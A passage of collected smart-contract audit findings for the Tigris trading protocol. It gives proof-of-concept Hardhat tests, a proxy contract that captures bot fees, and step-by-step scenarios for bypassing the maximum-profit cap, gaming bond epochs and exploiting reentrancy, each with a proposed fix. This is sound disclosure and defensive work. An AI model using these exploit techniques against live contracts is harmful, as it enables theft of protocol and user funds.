https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294 ```solidity     function distribute(address _tigAsset, uint _amount) external {         if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;         try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {             accRewardsPerNFT[_tigAsset] += _amount/totalSupply();         } catch {             return;         }     } ```  ## Proof of Concept Functions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.  Please add the following test in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details. ```typescript     it.only("Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called", async function () {       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("30000"), parseEther("10000"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther("20000"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get("GovNFT");       const govnft = await ethers.getContractAt("GovNFT", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, "10000000000000000000", "0", "0", "0", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal("0");        // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.       // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal("0");     }); ```  Furthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\Trading.sol`. ```solidity 689:     function _handleOpenFees( 690:         uint _asset, 691:         uint _positionSize, 692:         address _trader, 693:         address _tigAsset, 694:         bool _isBot 695:     ) 696:         internal 697:         returns (uint _feePaid) 698:     { 699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset); ... 732:         unchecked { 733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT; 734:             _feePaid = 735:                 _positionSize 736:                 * (_fees.burnFees + _fees.botFees) // get total fee% 737:                 / DIVISION_CONSTANT // divide by 100% 738:                 + _daoFeesPaid; 739:             emit FeesDistributed( 740:                 _tigAsset, 741:                 _daoFeesPaid, 742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT, 743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0, 744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT, 745:                 _referrer 746:             ); 747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid); 748:         } 749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose 750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); 751:     } ```  Then, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details. ```typescript     it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,              can receive deserved rewards after initiateMarketOrder function is called`, async function () {       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("30000"), parseEther("10000"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther("20000"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get("GovNFT");       const govnft = await ethers.getContractAt("GovNFT", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, "10000000000000000000", "0", "0", "0", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal("0");        // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000       //   because her or his Governance NFT was minted before initiateMarketOrder function was called.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal("10000000000000000000");     }); ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749 can be updated to the following code. ```solidity         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/JC-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/c3phas-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L513-L517   # Vulnerability details   The `PairsContract` registeres the total long/short position that's open for a pair of assets, whenever a new position is created the total grows accordingly. However at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.  ## Impact The OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).   ## Proof of Concept In the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.   ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..dfb7f98 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -778,7 +778,7 @@ describe("Trading", function () {       */      it("Creating and executing limit buy order, should have correct price and bot fees", async function () {        // Create limit order -      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; +      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("100"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther("20000"), PermitData, owner.address);        expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened @@ -787,6 +787,9 @@ describe("Trading", function () {        await network.provider.send("evm_increaseTime", [10]);        await network.provider.send("evm_mine");   +      let count = await position.getCount(); +      let id = count.toNumber() - 1; +        // Execute limit order        let PriceData = [node.address, 0, parseEther("10000"), 10000000, 2000000000, false]; // 0.1% spread        let message = ethers.utils.keccak256( @@ -798,8 +801,22 @@ describe("Trading", function () {        let sig = await node.signMessage(          Buffer.from(message.substring(2), 'hex')        ); +      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);         -      await trading.connect(user).executeLimitOrder(1, PriceData, sig); + +      let oi = await pairscontract.idToOi(0, stabletoken.address); +      expect(oi.longOi.toNumber()).to.equal(0); +      console.log({oi, stable:stabletoken.address}); + +      await trading.connect(user).executeLimitOrder(id, PriceData, sig); +      let trade = await position.trades(id); +      console.log(trade); +      oi = await pairscontract.idToOi(0, stabletoken.address); +      console.log(oi); + +      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber()); + +        expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position        expect((await trading.openFees()).botFees).to.equal(2000000); @@ -807,6 +824,7 @@ describe("Trading", function () {        let [,,,,price,,,,,,,] = await position.trades(1);        expect(price).to.equal(parseEther("20020")); // Should have guaranteed execution price with spread      }); +    return;      it("Creating and executing limit sell order, should have correct price and bot fees", async function () {        // Create limit order        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, false, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; @@ -1606,6 +1624,7 @@ describe("Trading", function () {        expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther("1.5"));      });    }); +  return;    describe("Modifying functions", function () {      it("Updating TP/SL on a limit order should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];  ```  Output: ``` 1) Trading        Limit orders and liquidations          Creating and executing limit buy order, should have correct price and bot fees:        AssertionError: expected 100000 to equal 90000       + expected - actual        -100000       +90000 ```   ## Recommended Mitigation Steps Correct the calculation to use margin after fees.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xNazgul-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738   # Vulnerability details  ## Description When ```initiateMarketOrder``` is called, ```_marginAfterFees``` are calculated and then use it to calculate ```_positionSize```  ```solidity uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  The problem is that ```_handleOpenFees``` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.  ## Impact For a referred trade, ```initiateMarketOrder``` always opens a position greater than the one supposed, by allowing to use more margin than the one expected.   ## POC The output of ```_handleOpenFees``` is ```_feePaid```, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees  ```solidity // No refferal fees are considered _feePaid =     _positionSize     * (_fees.burnFees + _fees.botFees) // get total fee%     / DIVISION_CONSTANT // divide by 100%     + _daoFeesPaid; ```  Then we can notice that, if the output of ```_handleOpenFees``` did not consider referral fees, neither would _marginAfterFees do  ```solidity uint256 _marginAfterFees =     _tradeInfo.margin-     _handleOpenFees(         _tradeInfo.asset,         _tradeInfo.margin*_tradeInfo.leverage/1e18,          _trader,         _tigAsset,         false);  // @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  ## Mitigation steps Consider referral fees when ```_feePaid``` is calculated in ```_handleOpenFees```  ```diff // In _handleOpenFees function +   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;     _feePaid =         _positionSize -       * (_fees.burnFees + _fees.botFees) // get total fee% +       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%         / DIVISION_CONSTANT // divide by 100%         + _daoFeesPaid; ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/joestakey-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/hansfriese-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L506   # Vulnerability details  ## Impact The open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.  As a result, the executed market order might be closed immediately and there would be an unexpected loss for users.  ## Proof of Concept As we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.  ```solidity File: 2022-12-tigris\contracts\Trading.sol 480:     function executeLimitOrder( 481:         uint _id,  482:         PriceData calldata _priceData, 483:         bytes calldata _signature 484:     )  485:         external 486:     { 487:         unchecked { 488:             _checkDelay(_id, true); 489:             tradingExtension._checkGas(); 490:             if (tradingExtension.paused()) revert TradingPaused(); 491:             require(block.timestamp >= limitDelay[_id]); 492:             IPosition.Trade memory trade = position.trades(_id); 493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true); 494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0); 495:             if (trade.orderType == 0) revert("5"); 496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert("6"); //LimitNotMet 497:             if (trade.direction && trade.orderType == 1) { 498:                 if (trade.price < _price) revert("6"); //LimitNotMet 499:             } else if (!trade.direction && trade.orderType == 1) { 500:                 if (trade.price > _price) revert("6"); //LimitNotMet 501:             } else if (!trade.direction && trade.orderType == 2) { 502:                 if (trade.price < _price) revert("6"); //LimitNotMet 503:                 trade.price = _price; 504:             } else { 505:                 if (trade.price > _price) revert("6"); //LimitNotMet 506:                 trade.price = _price; //@audit check sl/tp 507:             }  508:             if(trade.direction) { 509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT; 510:             } else { 511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT; 512:             }  ```  But it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.  The new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.  Originally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L625-L627   # Vulnerability details  ## Impact Users can bypass the `maxWinPercent` limit using a partial closing.  As a result, users can receive more funds than their upper limit from the protocol.  ## Proof of Concept As we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.  ``` Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually. ```  And this logic was implemented like below in `_closePosition()`.  ```solidity File: 2022-12-tigris\contracts\Trading.sol 624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot); 625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit 626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT; 627:                 } ```  But it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.  1. Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees. 2. If `maxWinPercent` = 500%, Alice should receive 500 at most. 3. But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100` 4. After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again. 5. As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should check the `maxWinPercent` between the partial payout and partial margin like below.  ```solidity     _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);      uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++     if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {          _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;     } ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576   # Vulnerability details    ## Impact Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot. A user can use that to to reduce the dao fees for closing an order and keep it to themselves. Instead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order. Since that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.  ## Proof of Concept  The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:  ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..e50b0cc 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -17,6 +17,7 @@ describe("Trading", function () {      let TradingExtension;    let tradingExtension; +  let myTrader;      let TradingLibrary;    let tradinglibrary; @@ -37,7 +38,7 @@ describe("Trading", function () {      let MockDAI;    let MockUSDC; -  let mockusdc; +  let mockusdc, mockdai;      let badstablevault;   @@ -55,6 +56,7 @@ describe("Trading", function () {      const Position = await deployments.get("Position");      position = await ethers.getContractAt("Position", Position.address);      MockDAI = await deployments.get("MockDAI"); +    mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);      MockUSDC = await deployments.get("MockUSDC");      mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);      const PairsContract = await deployments.get("PairsContract"); @@ -84,6 +86,10 @@ describe("Trading", function () {      TradingLibrary = await deployments.get("TradingLibrary");      tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);      await trading.connect(owner).setLimitOrderPriceRange(1e10); + + +    let mtFactory = await ethers.getContractFactory("MyTrader"); +    myTrader = await mtFactory.deploy(Trading.address, Position.address);    });    describe("Check onlyOwner and onlyProtocol", function () {      it("Set max win percent", async function () { @@ -536,6 +542,31 @@ describe("Trading", function () {        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened        expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther("0")); // Should no tigAsset left      }); + +    it("Test my trader", async function () { +      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; +      let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; +      let message = ethers.utils.keccak256( +        ethers.utils.defaultAbiCoder.encode( +          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'], +          [node.address, 0, parseEther("20000"), 0, 2000000000, false] +        ) +      ); +      let sig = await node.signMessage( +        Buffer.from(message.substring(2), 'hex') +      ); +       +      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true]; +      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); + + +      await trading.connect(owner).approveProxy(myTrader.address, 1e10); +      await myTrader.connect(owner).closeTrade(1, PriceData, sig); + + +    }); +  return; +      it("Closing over 100% should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; @@ -551,8 +582,10 @@ describe("Trading", function () {                let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); +        await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith("BadClosePercent");      }); +    return;      it("Closing 0% should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; @@ -700,6 +733,7 @@ describe("Trading", function () {        expect(margin).to.equal(parseEther("500"));      });    }); +  return;    describe("Trading using <18 decimal token", async function () {      it("Opening and closing a position with tigUSD output", async function () {        await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time  ```  `MyTrader.sol`: ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0;  import {ITrading} from "../interfaces/ITrading.sol"; import "../utils/TradingLibrary.sol"; import "../interfaces/IPosition.sol"; import {ERC20} from "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";     contract MyTrader{      ITrading trading;     IPosition position;      receive() payable external{      }      constructor(address _trading, address _position){         trading = ITrading(_trading);         position = IPosition(_position);     }      function closeTrade(         uint _id,         PriceData calldata _priceData,         bytes calldata _signature     ) public{         bool _tp = false;                  trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);         trading.limitClose(_id, _tp, _priceData, _signature);               }  } ```  ## Recommended Mitigation Steps Don't allow updating sl or tp and 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/unforgiven-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86   # Vulnerability details  ## Impact Function `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`, function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. so during normal bond creation the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. but if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` to set very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`. This would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.  ## Proof of Concept This is `distribute()` code in BondNFT contract: ``` function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` As you can see when `totalShares[_tigAsset] == 0` then the value of `epoch[_tigAsset]` won't get updated to the today. and there is no other logics in the code to update `epoch[tigAsset]`. so when `totalShares[_tigAsset] == 0` then the value of the `epoch[tigAsset]` would be out dated. this would happen when asset is recently added to the BondNFT assets or when in some time there is no bond left. When this condition happens and a user call `Lock.lock()` to create a bond the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0 so for that asset `epoch[]` won't get updated and in the `BondNFT.createLock()` the wrong value would set as bond't mint epoch. This is `Lock.lock()` code: ```     function lock(         address _asset,         uint _amount,         uint _period     ) public {         require(_period <= maxPeriod, "MAX PERIOD");         require(_period >= minPeriod, "MIN PERIOD");         require(allowedAssets[_asset], "!asset");          claimGovFees();          IERC20(_asset).transferFrom(msg.sender, address(this), _amount);         totalLocked[_asset] += _amount;                  bondNFT.createLock( _asset, _amount, _period, msg.sender);     } ``` And this is `BondNFT.createLock()` code: ```     function createLock(         address _asset,         uint _amount,         uint _period,         address _owner     ) external onlyManager() returns(uint id) {         require(allowedAsset[_asset], "!Asset");         unchecked {             uint shares = _amount * _period / 365;             uint expireEpoch = epoch[_asset] + _period;             id = ++totalBonds;             totalShares[_asset] += shares;             Bond memory _bond = Bond(                 id,             // id                 address(0),     // owner                 _asset,         // tigAsset token                 _amount,        // tigAsset amount                 epoch[_asset],  // mint epoch                 block.timestamp,// mint timestamp                 expireEpoch,    // expire epoch                 0,              // pending                 shares,         // linearly scaling share of rewards                 _period,        // lock period                 false           // is expired boolean             );             _idToBond[id] = _bond;             _mint(_owner, _bond);         }         emit Lock(_asset, _amount, _period, _owner, id);     } ```  if a bond get wrong value for mint epoch it would have wrong value for expire epoch and user would get a lot of share by lock for small time. for example this scenario: 1. let's assume `epoch[asset1]` is out dated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days) 2. during this time because `totalShare[asset1]` was 0 so `distribute()` function won't udpate `epoch[asset1]` and `epoch[asset1]` would show 30 days ago. 3. attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days. 4. some reward would get distributed into the BondNFT for the `asset1`. 5. other users would create lock too. 6. attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.  so attacker was able to create lock for long time and get shares and rewards based on that but attacker can release lock after short time.  ## Tools Used VIM  ## Recommended Mitigation Steps update `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868   # Vulnerability details  ## Impact  Trade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices   ## Proof of Concept      function _checkDelay(uint _id, bool _type) internal {         unchecked {             Delay memory _delay = blockDelayPassed[_id];             //in those situations             if (_delay.actionType == _type) {                 blockDelayPassed[_id].delay = block.number + blockDelay;             } else {                 if (block.number < _delay.delay) revert("0"); //Wait                 blockDelayPassed[_id].delay = block.number + blockDelay;                 blockDelayPassed[_id].actionType = _type;             }         }     }  _checkDelay enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. The user would open their position 1 Arbitrum block before the sync happens, the close it the very next block. It would appear that there has been 5 block (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks I would be impossible to block this behavior through parameter changes.  It also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  The delay should be measured using block.timestamp rather than block.number
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Position.sol#L126-L161   # Vulnerability details  ## Impact Function `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give attacker opportunity to reenter the Trading contract logics and perform malicious action while contract storage state is wrong. the only limitation of the attacker is that he need to bypass `_checkDelay()` checks. attacker can perform this action: 1. call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code. 2. call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.  ## Proof of Concept This is `mint()` code in Position contract: ```     function mint(         MintTrade memory _mintTrade     ) external onlyMinter {         uint newTokenID = _tokenIds.current();          Trade storage newTrade = 